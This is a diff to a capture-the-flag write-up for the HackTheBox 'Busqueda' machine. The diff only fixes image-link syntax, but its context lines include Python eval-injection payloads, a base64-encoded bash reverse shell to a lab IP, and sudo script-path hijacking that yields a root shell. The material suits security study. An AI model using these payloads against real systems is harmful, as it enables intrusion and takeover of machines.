@@ -60,20 +60,20 @@ nc -lvnp 9001 # Listener for the reverse shell
 
 
 The reverse shell is obtained as shown:
-![[/writeups/busqueda-HackTheBox/6.png]]
+![](/writeups/busqueda-HackTheBox/6.png)
+
 
 ### Reverse Shell in the Manual Way
 
 Opened Burp Suite for gaining access in manual way. 
 
 The site is sending POST request to `/search` with the parameters `engine` and `query` as shown below:
-![[/writeups/busqueda-HackTheBox/7.png]]
+![](/writeups/busqueda-HackTheBox/7.png)
 
 Added a payload with the value of the query parameter to check if its behaviour changes with special characters. 
 
 Added special character list by SecList as the list:
-![[/writeups/busqueda-HackTheBox/8.png]]
-
+![](/writeups/busqueda-HackTheBox/8.png)
 
 After checking I found that it was not giving any result for the characters `' and \`. So, The logic here was, it was executing some python command like eval. 
 The logic can be applied that it was doing something like this:
@@ -87,8 +87,7 @@ a')+print("Hello")#
 ```
 
 So, tried this
-
-![[/writeups/busqueda-HackTheBox/9.png]]
+![](/writeups/busqueda-HackTheBox/9.png)
 
 It printed `Hello`. It means it is executing out python command. 
 In order to get command execution I tried the following command:
@@ -105,7 +104,7 @@ a')+__import__('os').system('id')#
 ```
 
 Run the above after URL encoding and we got a code execution as shown below:
-![[/writeups/busqueda-HackTheBox/10.png]]
+![](/writeups/busqueda-HackTheBox/10.png)
 
 Now, we have to get a reverse shell somehow. 
 
@@ -133,24 +132,21 @@ a')+__import__('os').system('echo "YmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNi4xNy85M
 ```
 
 Got the reverse shell as shown below:
-![[/writeups/busqueda-HackTheBox/11.png]]
-
+![](/writeups/busqueda-HackTheBox/11.png)
 
 ## Privilege Escalation 
 
 After gaining the initial access, I explored the current directory. It contain a .git folder. The config of the git repository contains a password as shown below:
-![[/writeups/busqueda-HackTheBox/12.png]]
-
+![](/writeups/busqueda-HackTheBox/12.png)
 
 I tried logging in for the current user with SSH, and I was successful because this was the password for the current user svc. 
 I checked for `Sudo` privilege escalation and found that the current user can run the `system-checkup.py` as root. 
 The following shows the result of `sudo -l`:
-![[/writeups/busqueda-HackTheBox/13.png]]
-
+![](/writeups/busqueda-HackTheBox/13.png)
 
 I tried, checking the content of this script, but the file was not readable by the current user as shown:
 
-![[/writeups/busqueda-HackTheBox/15.png]]
+![](/writeups/busqueda-HackTheBox/15.png)
 
 The file can only be executed, so I tried executing the file as root user with the following command:
 
@@ -159,10 +155,10 @@ sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py
 ```
 
 The following three commands can be executed with it as shown:
-![[/writeups/busqueda-HackTheBox/16.png]]
+![](/writeups/busqueda-HackTheBox/16.png)
 
 Seems like the `docker-inspect` can not be executed as it is:
-![[/writeups/busqueda-HackTheBox/17.png]]
+![](/writeups/busqueda-HackTheBox/17.png)
 
 I checked online for its usage and the following command can be used to get details:
 ```
@@ -174,16 +170,15 @@ sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --fo
 ```
 
 Run the above command and got this data as shown:
-![[/writeups/busqueda-HackTheBox/19.png]]
+![](/writeups/busqueda-HackTheBox/19.png)
 
 This gave us another password, which initially didn't understand. But after further enumeration, I figured out that there was another website running on the `gitea.searcher.htb`. This was found on the apache2 enabled sites as shown:
-![[/writeups/busqueda-HackTheBox/20.png]]
-
+![](/writeups/busqueda-HackTheBox/20.png)
 
 Added this website in the `/etc/hosts` as well and visited it. This was asking for the username and password. So, used administrator as the username and the above found password as the password. I was able to logged in as an administrator here. 
 
 The script we found earlier were listed here and were readable as shown below:
-![[/writeups/busqueda-HackTheBox/21.png]]
+![](/writeups/busqueda-HackTheBox/21.png)
 
 So, we can analyse these files to find any vulnerability. 
 
@@ -191,8 +186,7 @@ It is found that when the `full-checkup` argument is provided to the script, it 
 
 
 The vulnerable part of the code:
-![[/writeups/busqueda-HackTheBox/23.png]]
-
+![](/writeups/busqueda-HackTheBox/23.png)
 
 Created the following code in the `/dev/shm` with name `full-checkup.sh`:
 ```bash
@@ -212,6 +206,6 @@ Now, the root shell is copied to the `/tmp` folder as shown below. The bash shel
 ```
 
 The following shows the result of the commands:
-![[/writeups/busqueda-HackTheBox/24.png]]
+![](/writeups/busqueda-HackTheBox/24.png)
 
 So, this gives us root access of the machine. 
